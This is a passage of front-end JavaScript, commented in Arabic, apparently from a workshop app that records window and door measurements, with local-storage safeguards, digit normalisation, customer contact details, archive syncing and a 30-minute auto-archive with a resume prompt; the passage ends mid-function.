
    let canvas = document.getElementById('canvas'), ctx = canvas.getContext('2d');

    // ===== طبقة حماية للتخزين المحلي (localStorage) =====
    // في بعض تطبيقات الويب المحوَّلة (WebView/APK) قد يكون التخزين المحلي معطلاً أو يفشل بصمت.
    // بدل أن يتوقف الكود بالكامل أو تُفقد البيانات دون تنبيه، نلتقط أي خطأ هنا ونحذّر المستخدم صراحةً.
    let storageAvailable = true;
    try {
      const __probeKey = '__ws_storage_probe__';
      localStorage.setItem(__probeKey, '1');
      localStorage.removeItem(__probeKey);
    } catch(e) {
      storageAvailable = false;
    }
    function safeGetItem(key) {
      try { return localStorage.getItem(key); } catch(e) { return null; }
    }
    /* إصلاح 8.8: لا إعادة تحميل تلقائية وكراسة قيد الإدخال مفتوحة. */
    window.wsHasUnsavedWork = function () {
      try { return Array.isArray(jobList) && jobList.length > 0; } catch (e) { return false; }
    };

    function safeSetItem(key, value) {
      try { localStorage.setItem(key, value); return true; }
      catch(e) { console.error('فشل حفظ البيانات محلياً:', e); return false; }
    }
    function safeRemoveItem(key) {
      try { localStorage.removeItem(key); return true; } catch(e) { return false; }
    }
    let jobList = [], isCanvasEmpty = true, editingIndex = -1;
    let lockStateKey = '';   // بصمة حالة القفل لكل صف، لمعرفة متى يلزم إعادة الرسم
                             // (تُعلن هنا مع بقية الحالة لأن أول رسم للجدول يحدث قبل هذا الموضع في الملف)
    let activeType = 'pvc'; // القسم المختار حالياً (بيفيسي/سرانتي/أي نوع مخصص)
    // v265: تفضيل عرض المقاسات محلي لكل جهاز، دون المساس بالبيانات أو طريقة الحساب.
    let measurementViewMode = ['diagram','sheet'].includes(safeGetItem('ws_measurement_view_mode')) ? safeGetItem('ws_measurement_view_mode') : 'classic';
    function setMeasurementView(mode) {
      measurementViewMode = ['diagram','sheet'].includes(mode) ? mode : 'classic';
      safeSetItem('ws_measurement_view_mode', measurementViewMode);
      if(window.WSEngine&&currentUserUid())try{const pref=window.WSEngine.preferences(currentUserUid());window.WSEngine.savePreferences(currentUserUid(),{...pref,view:measurementViewMode});}catch(e){}
      const table = document.getElementById('mainTable');
      if (table) { table.classList.toggle('diagram-view', measurementViewMode === 'diagram'); table.classList.toggle('sheet-view', measurementViewMode === 'sheet'); }
      const classic = document.getElementById('measurementViewClassicBtn');
      const diagram = document.getElementById('measurementViewDiagramBtn');
      const sheet = document.getElementById('measurementViewSheetBtn');
      if (classic) classic.setAttribute('aria-pressed', String(measurementViewMode === 'classic'));
      if (diagram) diagram.setAttribute('aria-pressed', String(measurementViewMode === 'diagram'));
      if (sheet) sheet.setAttribute('aria-pressed', String(measurementViewMode === 'sheet'));
      if (classic) classic.style.outline = measurementViewMode === 'classic' ? '2px solid #397fe5' : 'none';
      if (diagram) diagram.style.outline = measurementViewMode === 'diagram' ? '2px solid #397fe5' : 'none';
      if (sheet) sheet.style.outline = measurementViewMode === 'sheet' ? '2px solid #397fe5' : 'none';
      if (typeof renderTable === 'function') renderTable();
    }
    function measurementNoteMarkup(note) {
      return note ? '<div class="ws-measurement-note" aria-label="ملاحظة المقاس">'+escHtml(String(note))+'</div>' : '';
    }
    function syncMeasurementNote(input) {
      autoGrowNote(input);
      const cell=input.closest('.direct-cell');if(!cell)return;
      let preview=cell.querySelector('.ws-measurement-note');
      if(!preview){preview=document.createElement('div');preview.className='ws-measurement-note';preview.setAttribute('aria-label','ملاحظة المقاس');cell.insertBefore(preview,input.closest('details'));}
      preview.textContent=input.value;preview.hidden=!input.value;
    }
    function measurementDiagramMarkup(w, h, type) {
      const nw = Math.max(1, Number(String(w).replace(/[^0-9.]/g, '')) || 1);
      const nh = Math.max(1, Number(String(h).replace(/[^0-9.]/g, '')) || 1);
      const scale = Math.min(120 / nw, 76 / nh, 1.5);
      const rw = Math.max(34, Math.min(120, Math.round(nw * scale)));
      const rh = Math.max(25, Math.min(76, Math.round(nh * scale)));
      return `<div class="dimension-diagram" aria-label="مخطط المقاس: ${escHtml(getTypeName(type || activeType || 'pvc'))}، العرض ${escHtml(w)} والارتفاع ${escHtml(h)}"><div class="diagram-main"><div class="diagram-width"><span class="diagram-label">عرض</span><strong>${escHtml(w)}</strong></div><div class="diagram-width-arrow" aria-hidden="true"><span></span></div><div class="diagram-rect" style="width:${rw}px;height:${rh}px"><span class="diagram-type-label">${escHtml(getTypeName(type || activeType || 'pvc'))}</span></div></div><div class="diagram-height-group"><div class="diagram-height-arrow" aria-hidden="true"><span></span></div><div class="diagram-height"><span class="diagram-label">ارتفاع</span><strong>${escHtml(h)}</strong></div><div class="diagram-height-arrow diagram-height-arrow-bottom" aria-hidden="true"><span></span></div></div></div>`;
    }

    let currentArchiveIndex = -1; // إن كانت المقاسات الحالية محمّلة من الأرشيف، نتتبع رقمها هنا لمزامنة أي تعديل تلقائياً معها

    /* 9.9.19+ — الحفظ الفوري والثابت
       لم تعد تغييرات جدول القياسات تحتاج إلى زر «حفظ التعديل».
       كل تعديل أو حذف يُعتمد فوراً محلياً ويُزامن تلقائياً مع الأرشيف.
       الكراسة القديمة تبقى للقراءة فقط حتى الضغط صراحةً على «تعديل وإضافة مقاسات». */
    let pendingSheetSnapshot = null;
    let pendingSheetReason = '';
    let pendingEditRowIndex = -1;
    let lastEntryActionAt = 0;

    function cloneJobList(list) {
      try { return JSON.parse(JSON.stringify(Array.isArray(list) ? list : [])); }
      catch (e) { return (Array.isArray(list) ? list.map(x => Object.assign({}, x)) : []); }
    }
    function hasPendingSheetChanges() { return false; }
    function beginPendingSheetChanges(reason) { return true; }
    function clearPendingSheetChanges() {
      pendingSheetSnapshot = null;
      pendingSheetReason = '';
      pendingEditRowIndex = -1;
      renderPendingChangesBar();
    }
    function savePendingSheetChanges() {
      // التوافق مع النسخ القديمة فقط؛ الحفظ أصبح فورياً ولا يوجد زر اعتماد.
      saveCurrentState();
      return true;
    }
    function cancelPendingSheetChanges() {
      // لا يوجد تراجع تلقائي للتغييرات المعتمدة.
      clearPendingSheetChanges();
    }
    function renderPendingChangesBar() {
      const bar = document.getElementById('measurementBottomActions');
      if (bar) bar.style.display = 'none';
    }
    window.addEventListener('pagehide', () => {
      // لا نعيد أي تغيير؛ البيانات تعتمد فوراً.
      pendingSheetSnapshot = null;
    });

    let currentArchiveDocId = null; // مُعرّف المستند في Firestore المرتبط بالمقاسات الحالية (هدف المزامنة الفعلي، مستقل عن ترتيب القائمة)
    let _loadingArchive = false;   // يمنع الحفظ السحابي أثناء استعادة كراسة محفوظة

    /* يضبط المستند المرتبط ويحفظه محلياً في نفس الوقت.
       الحفظ ضروري: بدونه يُفقد الارتباط عند الخروج والدخول، فيُنشأ أرشيف
       جديد لنفس العمل عند أول تعديل — وهذا كان سبب تكرار العميل في الأرشيف. */
    function setCurrentArchiveDoc(id) {
      currentArchiveDocId = id || null;
      try { safeSetItem('ws_current_archive_id', currentArchiveDocId || ''); } catch(e) {}
    }
    /* ترتيب الأرشيف: يُحفظ محلياً فيبقى بين الجلسات — تفضيل شخصي لا
       حالة عمل، فلا يُزامَن بين الأجهزة. */
    let archiveSort = (function () {
      try { return safeGetItem('ws_archive_sort') === 'date' ? 'date' : 'name'; }
      catch (e) { return 'name'; }
    })();

    function setArchiveSort(mode) {
      archiveSort = (mode === 'date') ? 'date' : 'name';
      try { safeSetItem('ws_archive_sort', archiveSort); } catch (e) {}
      loadArchiveUI();
    }

    let archives = []; // قائمة الأرشيف الحيّة، تُحدَّث تلقائياً من Firestore عبر attachMeasurementJobsSync()
    let archivesTrash = []; // الكراسات المنقولة لسلة المهملات (deleted:true) — تُفصل في نفس المستمع
    let sheetViewOnly = false; // كراسة محفوظة مفتوحة للقراءة فقط (يُعرَّف هنا لأن renderTable تقرأه)
    /* مفتاح شكل صف الإضافة — يُعرَّف هنا لا عند دالته.
    /* حالة اعتماد الخدمة لهذه الكراسة.
       تُحفظ مع الكراسة وتُستعاد معها، لأن الاعتماد يفتح حساباً في الفواتير
       — واعتماده مرتين يعني فاتورتين لنفس الشغل ومطالبة الزبون بضعف قيمته. */
    let sheetApproval = null;   // { invId, paid, at }
    let approvingNow = false;   // قفل أثناء التنفيذ يمنع ضغطتين متتاليتين
    let archiveSyncTimer = null; // لتأخير (debounce) كتابة التعديلات المتكررة أثناء الكتابة إلى Firestore
    let custLocation = null; // موقع العميل المحفوظ { lat, lng } أو null إن لم يُحدَّد بعد
    /* ⚠️ إصلاح 8.8: كان JSON.parse هنا عارياً في **النطاق الأعلى**.
       قيمة مخزَّنة تالفة (كتابة انقطعت عند امتلاء الحصة) ترمي
       SyntaxError فتوقف تنفيذ كتلة السكربت كلها — والصفحة تفتح بيضاء
       لا يعمل فيها زر واحد، في كل مرة، إلى أن تُمسح بيانات المتصفح. */
    let priceDB = wsParse(safeGetItem('workshop_prices'), []);
    if (!Array.isArray(priceDB)) priceDB = [];
    let noteHistory = wsParse(safeGetItem('note_history'), ["زجاج دبل", "بولي ون ابيض", "اكسسوار الماني", "سحاب", "ثابت"]);
    if (!Array.isArray(noteHistory)) noteHistory = ["زجاج دبل", "بولي ون ابيض", "اكسسوار الماني", "سحاب", "ثابت"];

    // ===== ضمان أن كل الأرقام في التطبيق غربية (0-9) دائماً، مهما كانت لغة لوحة مفاتيح الجهاز =====
    // يحوّل أي رقم عربي (٠-٩) أو فارسي (۰-۹) مكتوب إلى رقم غربي مقابل
    function toWesternDigits(str) {
      if(str == null) return str;
      const map = { '٠':'0','١':'1','٢':'2','٣':'3','٤':'4','٥':'5','٦':'6','٧':'7','٨':'8','٩':'9',
                    '۰':'0','۱':'1','۲':'2','۳':'3','۴':'4','۵':'5','۶':'6','۷':'7','۸':'8','۹':'9' };
      return String(str).replace(/[٠-٩۰-۹]/g, ch => map[ch] || ch);
    }
    // يراقب حقل الهاتف وكل حقول الأرقام (المُعلَّمة بكلاس numeric-input) في الصفحة - الحالية وأي حقول تُضاف
    // لاحقاً كأنواع مخصصة - ويحوّل أي رقم عربي/فارسي يُكتب فيها إلى رقم غربي فوراً أثناء الكتابة، قبل أن تقرأ
    // أي دالة أخرى قيمة الحقل. حقول الأرقام هنا نصية (text) عمداً وليست (number): حقول (number) القياسية
    // ترفض بصمت أي رقم عربي/فارسي يُكتب فيها (لا تقبله إطلاقاً)، بينما هنا نقبله ثم نحوّله فوراً لرقم غربي
    document.addEventListener('input', function(e) {
      const el = e.target;
      if(!el || el.tagName !== 'INPUT') return;
      if(el.type === 'tel') {
        const converted = toWesternDigits(el.value);
        if(converted !== el.value) {
          const pos = el.selectionStart;
          el.value = converted;
          try { el.setSelectionRange(pos, pos); } catch(err) {}
        }
        return;
      }
      if(el.classList.contains('numeric-input')) {
        let cleaned = toWesternDigits(el.value).replace(/[^0-9.]/g, '');
        const firstDot = cleaned.indexOf('.');
        if(firstDot !== -1) cleaned = cleaned.slice(0, firstDot + 1) + cleaned.slice(firstDot + 1).replace(/\./g, '');
        if(cleaned !== el.value) {
          const sameLength = cleaned.length === el.value.length;
          const pos = el.selectionStart;
          el.value = cleaned;
          if(sameLength) { try { el.setSelectionRange(pos, pos); } catch(err) {} }
        }
      }
    }, true);
    // تنسيق تاريخ (ووقت) بأرقام غربية دائماً، بدل الاعتماد على toLocaleDateString/toLocaleString
    // اللتين قد تعرضان أرقاماً عربية تلقائياً حسب لغة الجهاز
    function formatWesternDate(d) {
      d = d || new Date();
      const day = String(d.getDate()).padStart(2, '0');
      const month = String(d.getMonth() + 1).padStart(2, '0');
      return `${day}/${month}/${d.getFullYear()}`;
    }
    function formatWesternDateTime(d) {
      d = d || new Date();
      const hh = String(d.getHours()).padStart(2, '0');
      const mm = String(d.getMinutes()).padStart(2, '0');
      return `${formatWesternDate(d)} ${hh}:${mm}`;
    }

    function toggleSection(id) {
      let el = document.getElementById(id);
      if (!el) return;
      el.style.display = el.style.display === 'block' ? 'none' : 'block';
    }

    // عند بدء كراسة/زبون جديد، أغلق الأرشيف تلقائياً لتقليل اللمسات
    // العرضية وإبقاء نموذج القياسات هو محور الصفحة.
    function closeArchiveCustomersPanel() {
      const panel = document.getElementById('archiveContent');
      if (panel) panel.style.display = 'none';
      const heading = document.querySelector('#archiveSection h4');
      if (heading) heading.setAttribute('aria-expanded', 'false');
      const chevron = heading && heading.querySelector('.fa-chevron-up, .fa-chevron-down');
      if (chevron) {
        chevron.classList.remove('fa-chevron-up');
        chevron.classList.add('fa-chevron-down');
      }
    }

    // تحديث شريط اسم ورقم هاتف العميل الظاهر أعلى الجدول مباشرة عند الكتابة
    function updateShareHeader() {
      const name = document.getElementById('custName').value.trim();
      const phone = document.getElementById('custPhone').value.trim();
      document.getElementById('shareCustName').innerText = name;
      document.getElementById('sharePhone').innerText = phone ? '📞 ' + phone : '';

      // أزرار الاتصال والنسخ: لا معنى لها بلا رقم
      const acts = document.getElementById('shareActions');
      if (acts) acts.style.display = phone ? 'flex' : 'none';

      /* سطر الموقع تحت الرقم: نصٌّ يبقى في الصورة، وأزراره لا تظهر فيها.
         فمن يستلم الصورة يقرأ الإحداثيات ويكتبها في خرائطه، ومن يعمل على
         الشاشة يفتحها أو ينسخها بضغطة. */
      const locBox = document.getElementById('shareLoc');
      const locTxt = document.getElementById('shareLocText');
      const hasLoc = !!(custLocation && typeof custLocation.lat === 'number');
      if (locBox && locTxt) {
        if (hasLoc) {
          const acc = (typeof custLocation.acc === 'number') ? ' (±' + custLocation.acc + 'm)' : '';
          locTxt.textContent = '📍 ' + custLocation.lat.toFixed(6) + ', ' + custLocation.lng.toFixed(6) + acc;
          locBox.style.display = 'flex';
        } else {
          locBox.style.display = 'none';
          locTxt.textContent = '';
        }
      }

      document.getElementById('shareHeader').style.display = (name || phone || hasLoc) ? 'block' : 'none';
    }

    // اتصال مباشر بالرقم المكتوب في الكراسة
    function callCustomer() {
      const phone = (document.getElementById('custPhone').value || '').trim();
      if (!phone) { showMiniToast('لا رقم هاتف في هذه الكراسة', '#157f4a'); return; }
      window.location.href = 'tel:' + encodeURIComponent(toLatinNums(phone).replace(/\s+/g, ''));
    }

    /* نسخ إلى الحافظة. clipboard الحديثة تحتاج سياقاً آمناً (https) وقد
       تُرفض على بعض الأجهزة، فنُبقي الطريقة القديمة بديلاً — وإلا فشل
       النسخ بصمت وظنّ المستخدم أن الزر لا يعمل. */
    async function copyTextSafe(txt, okMsg) {
      if (!txt) return;
      try {
        if (navigator.clipboard && window.isSecureContext) {
          await navigator.clipboard.writeText(txt);
          showMiniToast(okMsg, '#047480');
          return;
        }
      } catch (e) { /* نُكمل بالبديل */ }
      try {
        const ta = document.createElement('textarea');
        ta.value = txt;
        ta.setAttribute('readonly', '');
        ta.style.cssText = 'position:fixed;top:-1000px;opacity:0;';
        document.body.appendChild(ta);
        ta.select();
        const ok = document.execCommand('copy');
        ta.remove();
        showMiniToast(ok ? okMsg : 'تعذّر النسخ — انسخه يدوياً', ok ? '#047480' : '#157f4a');
      } catch (e) {
        showMiniToast('تعذّر النسخ — انسخه يدوياً', '#157f4a');
      }
    }

    function copyCustomerPhone() {
      const phone = (document.getElementById('custPhone').value || '').trim();
      if (!phone) { showMiniToast('لا رقم هاتف في هذه الكراسة', '#157f4a'); return; }
      copyTextSafe(toLatinNums(phone).replace(/\s+/g, ''), 'نُسخ رقم الهاتف ✅');
    }

    function copyCustomerLocation() {
      if (!custLocation || typeof custLocation.lat !== 'number') {
        showMiniToast('لا موقع محفوظ في هذه الكراسة', '#157f4a'); return;
      }
      // الإحداثيات وحدها: تُلصق في أي تطبيق خرائط مباشرةً
      copyTextSafe(custLocation.lat + ',' + custLocation.lng, 'نُسخت إحداثيات الموقع ✅');
    }

    /* ============================================================
       الحفظ التلقائي عند التوقف عن العمل
       ------------------------------------------------------------
       إن مرّت 15 دقيقة بلا أي نشاط، تُحفظ الكراسة في الأرشيف وتُفرَّغ
       تلقائياً، حتى لا يبدأ الزبون التالي فوق مقاسات السابق لو نُسي
       الضغط على زر الحفظ. لا شيء يضيع: تظهر لافتة فيها زر «استرجاع»
       تُعيد الكراسة كما كانت بضغطة واحدة.
       ============================================================ */
    /* المدة تُحسب من آخر تغيير في المقاسات نفسها، لا من آخر لمسة على الشاشة.
       الفرق جوهري: العدّاد القديم كان يُصفَّر بأي نقرة أو تمرير، فكراسة
       اكتملت قبل ساعة تبقى معروضة ما دام أحد يتصفّح الصفحة — وهذا هو
       بالضبط ما يجعل الزبون التالي يُكتب فوق مقاسات السابق.
       الآن: نصف ساعة من آخر مقاس أُدخل، ثم تُحفظ الكراسة وتُفرَّغ الصفحة
       ويبدأ تسجيل عمل جديد مباشرةً.
       المهلة قصيرة عمداً، ولذلك يسبقها تنبيه بدقيقة فيه زر تأجيل، ويبقى
       الاسترجاع بضغطة واحدة — فلا شيء يضيع بأي حال. */
    const AUTO_ARCHIVE_MS = 30 * 60 * 1000;   // نصف ساعة من آخر إدخال/مقاس
    const AUTO_ARCHIVE_WARN_MS = 60 * 1000;   // تنبيه قبل التفريغ بدقيقة
    const AUTO_ARCHIVE_KEY = 'ws_last_measure_at';
    let lastMeasurementAt = Date.now();
    /* وقت آخر كتابة في خانات المقاس (بلا إضافة للجدول).
       نتتبّعه لأن وجود نص في الخانة كان يوقف الحفظ التلقائي **إلى الأبد**:
       يكتب المستخدم عرضاً ثم ينشغل ويترك الجهاز، فيبقى الرقم في الخانة
       فلا تُحفظ الكراسة ولا تُنظَّف مهما طال الوقت — وهو بالضبط الحال
       الذي يُفترض أن يعالجه الحفظ التلقائي. */
    let lastDraftTypedAt = 0;
    // وقت فتح تعديل صف — لنفس السبب: تعديل مفتوح ومنسيّ كان يوقف الحفظ للأبد
    let editOpenedAt = 0;
    let _sheetFingerprint = '';
    let _autoArchiveWarned = false;
    let lastSavedSheet = null;

    /* بصمة خفيفة للمقاسات والبنود المالية — لا تشمل الصور حتى لا يثقل
       حسابها مع كل ضغطة مفتاح. */
    function sheetFingerprint() {
      try {
        const j = (jobList || []).map(i =>
          [i.type, i.w, i.h, i.res, i.sk || '', i.itemColor || '', i.note || ''].join('|')
        ).join(';');
        const b = Array.from(document.querySelectorAll('#billArea input'))
          .map(x => x.value).join('|');
        return j + '#' + b + '#' + ((document.getElementById('custName') || {}).value || '');
      } catch (e) { return _sheetFingerprint; }
    }

    // يُستدعى بعد كل حفظ للحالة: أي تغيير حقيقي في المقاسات يُعيد ضبط نصف الساعة
    function touchMeasurementActivity() {
      const fp = sheetFingerprint();
      if (fp === _sheetFingerprint) return;
      _sheetFingerprint = fp;
      lastMeasurementAt = Date.now();
      _autoArchiveWarned = false;
      dismissAutoArchiveWarning();
      try { safeSetItem(AUTO_ARCHIVE_KEY, String(lastMeasurementAt)); } catch (e) {}
    }

    // موجودة للتوافق مع النداءات القديمة — الضبط صار عبر تغيّر المقاسات نفسها
    function resetIdleTimer() { touchMeasurementActivity(); }

    /* الحارس الدوري. لا يُفرَّغ شيء إن كان المستخدم يعمل الآن فعلاً:
       تعديل صف مفتوح، أو نص مكتوب في نموذج الإدخال لم يُضَف بعد. */
    /* ════════════════════════════════════════════════════════════
       الحفظ التلقائي وتهيئة الشاشة للعمل التالي
       ------------------------------------------------------------
       بعد نصف ساعة من آخر مقاس: تُحفظ الكراسة في الأرشيف، وتُنظَّف
       الشاشة بالكامل، وتصير جاهزة لمقاسات جديدة فوراً.

       أُعيدت كتابة الدالة لأنها تراكمت عبر تعديلات متتابعة حتى صار فيها
       ثلاث كتل تفريغ متطابقة وكتلتان لنفس الشرط — الثانية منهما لا
       تُنفَّذ أبداً لأن الأولى تُنهي الدالة. الآن: مسار واحد للتنظيف
       يستدعيه الجميع، فأي تعديل لاحق يقع في مكان واحد لا ثلاثة.
       ════════════════════════════════════════════════════════════ */

    // تنظيف كامل + تهيئة للعمل التالي. لا يحفظ شيئاً — المستدعي يقرّر ذلك.
    function resetSheetForNextJob(toastMsg) {
      try {
        rotateArchiveCreationOperationId();
        jobList = [];
        editingIndex = -1;
        editOpenedAt = 0;
        currentArchiveIndex = -1;
        setCurrentArchiveDoc(null);
        custLocation = null;
        custPhotos = [];
        renderProjectPhotos();
        document.getElementById('custName').value = '';
        document.getElementById('custPhone').value = '';
        document.getElementById('billArea').innerHTML = '';
        const pe = document.getElementById('sheetPaid'); if (pe) pe.value = '';
        const sn2 = document.getElementById('sheetNotes'); if (sn2) sn2.value = '';
        document.getElementById('editHint').style.display = 'none';
        clearInputs();
        clearExtraRepeats();
        // اللوحة جزء من الكراسة: تركها مرسومة يعني رسم زبون سابق مع مقاس جديد
        try { initCanvas(); } catch (e) {}
        const _mb = document.getElementById('mediaBox'); if (_mb) _mb.style.display = 'none';
        includeBaseRow = false;
        sheetTotalOverride = null;
        _dupWarnedFor = '';
        setSheetApproval(null);
        setSheetViewOnly(false);      // الشاشة الجديدة مفتوحة للكتابة دائماً
        resetAutoLocation();
        lastDraftTypedAt = 0;
        _autoArchiveWarned = false;
        lastMeasurementAt = Date.now();   // العدّاد يبدأ من الآن للعمل الجديد
        dismissAutoArchiveWarning();
        try { switchBox('pvc'); } catch (e) {}
        try { renderExtraChips(); } catch (e) {}
        updateMainActionLabel();
        renderTable();
        saveCurrentState();
        updateShareHeader();
        window.scrollTo({ top: 0, behavior: 'smooth' });
        if (toastMsg) showMiniToast(toastMsg, '#047480');
      } catch (e) { console.error('resetSheetForNextJob:', e); }
    }

    /* ════════════════════════════════════════════════════════════
       اختيار الكراسة عند العودة خلال أقل من نصف ساعة
       ------------------------------------------------------------
       إذا خرج المستخدم من صفحة القياسات ثم عاد قبل انتهاء مهلة 30 دقيقة،
       لا نعيده مباشرةً إلى كراسة الزبون السابق ولا نفرّغها بصمت.
       نعرض شاشة كبيرة وواضحة: «متابعة الزبون السابق» أو «فتح جديد»،
       مع اسم الزبون حتى لا يحدث خلط بين كراسات العملاء.
       ════════════════════════════════════════════════════════════ */
    let _resumeChoiceOpen = false;

    function showResumeChoice(customerName) {
      if (_resumeChoiceOpen) return;
      _resumeChoiceOpen = true;
      const old = document.getElementById('resume-sheet-choice');
      if (old) old.remove();
      const name = String(customerName || '').trim() || 'بدون اسم';
      const modal = document.createElement('div');
      modal.id = 'resume-sheet-choice';
      modal.dir = 'rtl';
      modal.style.cssText = [
        'position:fixed','inset:0','z-index:99999','display:flex','align-items:center','justify-content:center',
        'padding:14px','background:rgba(2,6,23,.84)','backdrop-filter:blur(10px)',
        'font-family:Cairo,Tajawal,Arial,sans-serif'
      ].join(';');
      modal.innerHTML = `
        <div role="dialog" aria-modal="true" aria-labelledby="resumeTitle" style="width:min(620px,100%);background:#fff;border-radius:32px;box-shadow:0 35px 100px rgba(0,0,0,.45);overflow:hidden;border:1px solid rgba(255,255,255,.65);">
          <div style="padding:28px 20px 22px;background:linear-gradient(145deg,#0f172a,#123b70 55%,#047857);color:#fff;text-align:center;">
            <div style="font-size:52px;line-height:1;margin-bottom:12px;">📋</div>
            <div id="resumeTitle" style="font-size:25px;font-weight:950;">وجدنا كراسة سابقة</div>
            <div style="margin-top:8px;font-size:15px;opacity:.9;">اختر ماذا تريد أن تفعل قبل متابعة العمل</div>
          </div>
          <div style="padding:22px 18px 24px;">
            <button type="button" onclick="startFreshSheetFromResume()" style="width:100%;min-height:112px;border:0;border-radius:24px;background:linear-gradient(135deg,#0ea5a5,#047857);color:#fff;font-family:inherit;font-size:31px;font-weight:950;cursor:pointer;box-shadow:0 14px 34px rgba(4,120,87,.30);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:4px;">
              <span>✨ بدء جديد</span><span style="font-size:13px;font-weight:800;opacity:.9;">كراسة جديدة لعميل جديد</span>
            </button>
            <button type="button" onclick="resumePreviousSheet()" style="width:100%;min-height:88px;margin-top:14px;border:2px solid #dbeafe;border-radius:22px;background:linear-gradient(135deg,#eff6ff,#ecfeff);color:#0f3b63;font-family:inherit;font-size:22px;font-weight:950;cursor:pointer;box-shadow:0 8px 22px rgba(15,59,99,.10);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:3px;">
              <span>↩️ متابعة إلى ${escapeHtml(name)}</span><span style="font-size:12px;color:#64748b;font-weight:800;">الاستمرار في كراسة الزبون السابق</span>
            </button>
            <div style="margin-top:13px;text-align:center;font-size:11px;color:#64748b;line-height:1.7;">عند اختيار «بدء جديد» تُحفظ الكراسة السابقة أولاً ولا تُحذف.</div>
          </div>
        </div>`;
      document.body.appendChild(modal);
    }

    function closeResumeChoice() {
      const modal = document.getElementById('resume-sheet-choice');
      if (modal) modal.remove();
      _resumeChoiceOpen = false;
    }

    function resumePreviousSheet() {
      // الاستئناف هو الاستثناء الوحيد لقاعدة «كل دخول جديد = كراسة جديدة».
      // هنا نعيد نفس العمل الذي كان مفتوحاً قبل الخروج الخطأ، بشرط أنه ما
      // زال داخل نافذة النصف ساعة. لا نستخدم اسم العميل للمطابقة أبداً.
      closeResumeChoice();
      try {
        let raw = safeGetItem('ws_last_state');
        let state = wsParse(raw, null);
        // v312: إذا كانت الحالة الأساسية مفقودة/تالفة/فارغة، جرّب آخر نسخة احتياطية
        // قبل بدء كراسة جديدة؛ هذا مهم خصوصاً للبنود المالية بلا مقاسات.
        if (!state || !hasAnyData(state)) {
          const backupRaw = safeGetItem('ws_last_state_backup_v312') ||
                            safeGetItem('ws_last_state_backup_v311') ||
                            safeGetItem('ws_last_state_backup_v310');
          const backupState = wsParse(backupRaw, null);
          if (backupState && hasAnyData(backupState)) {
            raw = backupRaw;
            state = backupState;
            safeSetItem('ws_last_state', backupRaw);
          }
        }
        const savedAt = parseInt(safeGetItem(AUTO_ARCHIVE_KEY) || '0', 10);
        const backupAt = parseInt(safeGetItem('ws_last_state_backup_v312_at') ||
                                  safeGetItem('ws_last_state_backup_v310_at') || '0', 10);
        const effectiveSavedAt = Math.max(savedAt || 0, backupAt || 0);
        const awayFor = effectiveSavedAt > 0 ? (Date.now() - effectiveSavedAt) : Infinity;
        if (awayFor >= AUTO_ARCHIVE_MS || !raw || !state || !hasAnyData(state)) {
          startFreshSheetFromResume();
          return;
        }

        currentArchiveIndex = -1;
        const savedArchiveId = safeGetItem('ws_current_archive_id') || '';
        setCurrentArchiveDoc(savedArchiveId || null);
        sheetViewOnly = false;
        try { safeSetItem('ws_sheet_viewonly', '0'); } catch (e) {}
        _loadingArchive = true;
        try { loadFromJSON(state); } finally { _loadingArchive = false; }
        _sheetFingerprint = sheetFingerprint();
        lastMeasurementAt = savedAt;
        _autoArchiveWarned = false;
        dismissAutoArchiveWarning();
        renderTable();
        applySheetLockUI();
      } catch (e) {
        console.error('resumePreviousSheet:', e);
        startFreshSheetFromResume();
      }
    }

    function startFreshSheetFromResume() {
      // «بدء جديد» يفصل الجلسة الجديدة عن أي كراسة سابقة ولا يكتب فوقها.
      closeResumeChoice();
      try {
        const raw = safeGetItem('ws_last_state');
        const state = wsParse(raw, null);
        // الكراسة الجارية تكون قد أُنشئت/مُزامنت تلقائياً أثناء العمل.
        // إذا كان فيها بيانات ولم يكن لها مستند بعد، نؤرشف نسخة منها فقط،
        // ثم نفصل الارتباط ونبدأ كراسة مستقلة.
        if (state && hasMeaningfulData(state) && !currentArchiveDocId) {
          _loadingArchive = true;
          try {
            loadFromJSON(state);
            _loadingArchive = false;
            createArchiveEntry();
          } catch (e) { _loadingArchive = false; console.error('archive abandoned session:', e); }
        }
      } catch (e) {}
      currentArchiveIndex = -1;
      setCurrentArchiveDoc(null);
      try {
        safeSetItem('ws_current_archive_id', '');
        safeSetItem('ws_sheet_viewonly', '0');
        safeRemoveItem('ws_last_state');
        safeRemoveItem(AUTO_ARCHIVE_KEY);
      } catch (e) {}
      resetSheetForNextJob('كراسة جديدة');
    }

    function autoArchiveTick() {
      // فحص رخيص أولاً: buildStateSnapshot يضم صور المرفقات بترميز base64،
      // وبناؤه كل خمس عشرة ثانية بلا داعٍ يُثقل الجهاز على كراسة فيها صور.
      if (!Array.isArray(jobList) || jobList.length === 0) return;
      if (!window.currentShopUser) return;                     // قبل اكتمال الدخول

      const elapsed = Date.now() - lastMeasurementAt;
      if (elapsed < AUTO_ARCHIVE_MS - AUTO_ARCHIVE_WARN_MS) return;   // لم يقترب الموعد بعد

      /* كراسة معتمدة أو معروضة للقراءة: محفوظة أصلاً، فلا شيء يُحفظ.
         لكن تركها معروضة إلى الأبد يعني أن من يفتح الجهاز بعدها يجد شاشة
         كراسة زبون سابق — وربما مقفولة — ولا يعرف كيف يبدأ. نُخليها. */
      if (sheetApproval || isSheetLocked()) {
        if (elapsed < AUTO_ARCHIVE_MS) return;
        if (editingIndex > -1) return;
        resetSheetForNextJob('أُخليت الشاشة — جاهزة لمقاسات جديدة');
        return;
      }

      /* تعديل صف مفتوح: لا نقاطعه ما دام حديثاً. أما تعديل فُتح ونُسي
         فيُلغى بعد المهلة، وإلا بقيت الكراسة معلّقة بلا حفظ إلى الأبد. */
      if (editingIndex > -1) {
        if (!editOpenedAt || Date.now() - editOpenedAt < AUTO_ARCHIVE_MS) return;
        editingIndex = -1;
        editOpenedAt = 0;
        try {
          updateMainActionLabel();
          document.getElementById('editHint').style.display = 'none';
          clearInputs();
          renderTable();
        } catch (e) {}
      }

      /* نصٌّ مكتوب في خانة المقاس لم يُضَف بعد: لا نقاطع من يكتب الآن.
         لكن رقماً كُتب ونُسي لا يجوز أن يمنع الحفظ إلى الأبد — فبعد ضعف
         المهلة على آخر كتابة نمضي ونُهمله (وهو محفوظ في مسودة الحالة
         على أي حال، فلا يضيع). */
      const draftTyped = Array.from(document.querySelectorAll('#inputSection input'))
        .some(i => (i.value || '').trim() !== '');
      if (draftTyped) {
        if (!lastDraftTypedAt) lastDraftTypedAt = Date.now();
        if (Date.now() - lastDraftTypedAt < AUTO_ARCHIVE_MS * 2) return;
      } else {
        lastDraftTypedAt = 0;
      }

      if (elapsed >= AUTO_ARCHIVE_MS) {
